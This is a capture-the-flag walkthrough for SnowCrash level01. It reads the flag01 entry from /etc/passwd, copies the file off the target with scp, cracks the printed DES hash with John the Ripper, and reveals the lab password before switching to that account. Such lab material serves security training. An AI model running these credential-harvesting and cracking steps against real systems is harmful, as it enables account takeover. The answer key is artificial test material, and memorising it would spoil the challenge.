# SnowCrash Level01 Guide
This guide will walk you through the process of finding the password for the `flag01` user.

## Procedure

0. **Login to the `level01` user**
    - Run the following command:
    ```shell
    su level01
    # enter previous flag
    ```
    - John ? John The Ripper ?  
    Make sure to install this tool on your host machine.

1. **Examine your environment using Unix commands.**
   
    - `id` : Shows user and group identities. 
    - `pwd` : Displays the current directory you're in. 
    - `ls -la` : Lists files and their permissions in the current directory.
    - Output: Nothing really interesting...
    
2. **Use 'grep' to search for specific user information in the `/etc/passwd` file.**
    - `cat /etc/passwd | grep flag01` : This command searches the filesystem for any information belonging to `flag01` in the `/etc/passwd` file.  
    The `/etc/passwd` file is where Unix stores user information, including the hashed passwords.

3. **Extract the encrypted password and the username.**
   
    - The result of the previous command contains: `flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash`
    - Here, `flag01` is the username and `42hDRfypTqqnw` is the hashed password.

4. **Copy the `/etc/passwd` output to you local machine**
    
    - Run the following command:
    ```shell
    scp -P <port> level01@<dist-machine-ip>:/etc/passwd /path/to/your/output/file
    ```
    - Enter the user's password

5. **Use John the Ripper to decrypt the password.**

    - John The Ripper is a popular password cracking software that can be used to crack passwords using various hashing algorithms.
    - Now run the command `john /path/to/your/output/file`
    - Output: 
        ```shell
        ...
        Proceeding with wordlist:./password.lst
        Enabling duplicate candidate password suppressor
        abcdefg          (flag01)  
        ...
        ```

6. **Access `flag01`.**
    - Use `su flag01` and input the decrypted password when prompted.
    - You should now have access to the `flag01` account!

## Useful link

    - https://github.com/openwall/john/tree/bleeding-jumbo